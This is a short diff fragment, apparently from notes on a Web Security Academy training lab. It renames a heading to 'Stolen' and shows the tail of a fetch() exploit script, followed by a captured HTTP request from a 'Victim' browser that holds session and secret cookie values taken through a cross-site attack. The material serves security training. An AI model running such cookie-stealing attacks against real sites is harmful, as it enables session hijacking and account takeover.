@@ -37,6 +37,6 @@ fetch('https://0a8b008f0425f585c07e1e22000d0069.web-security-academy.net', {
 </script>
 
 
-## Stoll
+## Stolen
 GET /capture-me HTTP/1.1 Host: 0a8b008f0425f585c07e1e22000d0069.web-security-academy.net Connection: keep-alive sec-ch-ua: sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36 sec-ch-ua-platform: Accept: */* Sec-Fetch-Site: same-site Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty Referer: https://exploit-0a1f00790415f543c0871e9e017900ab.web-security-academy.net/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=lS11cnhOnrl4Va8IJOOC1z0PjkYktamM; secret=OiHDstFosTyKWI46chkvYJHH9fffcZyN; session=cFuzayEDIftolGxEj2H55wC1bsE6h1M3; _lab_
 
